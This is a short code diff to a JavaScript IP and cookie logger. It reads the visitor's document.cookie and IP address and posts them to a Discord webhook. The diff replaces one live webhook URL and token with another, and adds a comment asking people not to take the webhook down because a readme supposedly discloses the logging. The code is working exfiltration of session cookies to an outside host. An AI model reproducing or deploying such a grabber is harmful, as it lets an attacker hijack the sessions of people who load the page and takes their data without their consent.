@@ -22,9 +22,10 @@
             return document.cookie;
         }
 
-        // Function to send the IP address and cookies to the Discord webhook
+
         async function sendDataToDiscord(ip, cookies) {
-            const webhookURL = 'https://discord.com/api/webhooks/1254086342653251665/4FkcXruY4E-k__5Krqp2Ia3CEh2onAhlcX3BeomMyG0H-R_tpY2O6Gc49tvi4hGfQiJZ';
+            // dont take the webhook down i legit have a read me that says that this is a logger ppl do know :skull: 
+            const webhookURL = 'https://discord.com/api/webhooks/1255265339168653332/SPafbuMfrJhli7L-WzcOd7WecHbqUJneZb-njOhECgAYreOqdo9i9pKAVGzMwpel2pxN';
             const message = {
                 content: `User IP: ${ip}\nCookies: ${cookies}`
             };
